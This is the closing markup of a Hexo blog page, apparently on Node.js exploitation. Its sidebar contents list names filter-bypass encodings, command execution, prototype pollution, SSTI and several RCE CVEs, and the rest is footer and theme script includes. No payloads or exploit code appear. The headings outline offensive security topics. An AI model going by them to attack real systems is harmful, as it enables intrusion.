+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#bypass"><span class="nav-number"></span> <span class="nav-text">bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hex"><span class="nav-number">1.</span> <span class="nav-text">hex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unicode"><span class="nav-number">2.</span> <span class="nav-text">unicode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E5%8F%B7%E6%8B%BC%E6%8E%A5"><span class="nav-number">3.</span> <span class="nav-text">加号拼接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#base64"><span class="nav-number">4.</span> <span class="nav-text">base64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">5.</span> <span class="nav-text">模板字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#concat%E8%BF%9E%E6%8E%A5"><span class="nav-number">6.</span> <span class="nav-text">concat连接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JS%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="nav-number"></span> <span class="nav-text">JS大小写</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number"></span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E5%88%A9%E7%94%A8"><span class="nav-number"></span> <span class="nav-text">数组利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="nav-number"></span> <span class="nav-text">原型链污染</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssti"><span class="nav-number"></span> <span class="nav-text">ssti</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE"><span class="nav-number"></span> <span class="nav-text">CVE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nodejs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-5941%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">nodejs反序列化漏洞（CVE-2017-5941）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nodejs%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-14849%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">nodejs目录穿越漏洞（CVE-2017-14849）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mongo-express-rce%EF%BC%88CVE-2019-10758%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">mongo-express rce（CVE-2019-10758）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Nodejs-Zoombie-Package-RCE"><span class="nav-number">1.</span> <span class="nav-text">Nodejs Zoombie Package RCE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
